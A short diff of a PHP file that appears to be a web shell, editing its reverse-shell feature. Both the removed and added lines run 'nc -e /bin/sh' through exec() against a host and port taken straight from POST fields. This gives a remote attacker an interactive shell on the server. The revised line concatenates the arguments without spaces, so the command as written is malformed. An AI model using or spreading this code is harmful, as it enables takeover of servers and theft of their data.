@@ -21,7 +21,9 @@ if (isset($_GET['page'])) {
     <font face="Cooper Black" color="#00688B">Port:</font><input type="text" name="Port"/>
     <input type="submit" name="submit2" /></center>';
       if (isset($_POST['RHOST'])){
-        exec('nc -e /bin/sh $_POST["RHOST"] $_POST["Port"]');
+        if (isset($_POST['Port'])){
+      exec( 'nc -e /bin/sh' . $_POST["RHOST"] . $_POST["Port"] );
+        }
     }
 }
   if ($_GET['page'] == 2){
